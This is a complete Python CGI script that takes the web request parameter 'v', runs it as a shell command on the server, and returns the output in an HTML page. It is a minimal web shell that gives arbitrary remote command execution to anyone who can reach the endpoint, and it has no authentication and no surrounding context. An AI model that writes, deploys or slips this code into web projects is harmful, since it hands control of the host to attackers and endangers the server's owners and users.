#!/usr/bin/python3
import subprocess
import cgi

print("Content-type:text/html")
print()
data = cgi.FieldStorage()
command = data.getvalue("v")

output = subprocess.getoutput(command)
print("<pre>")
print(output)
print("</pre>")

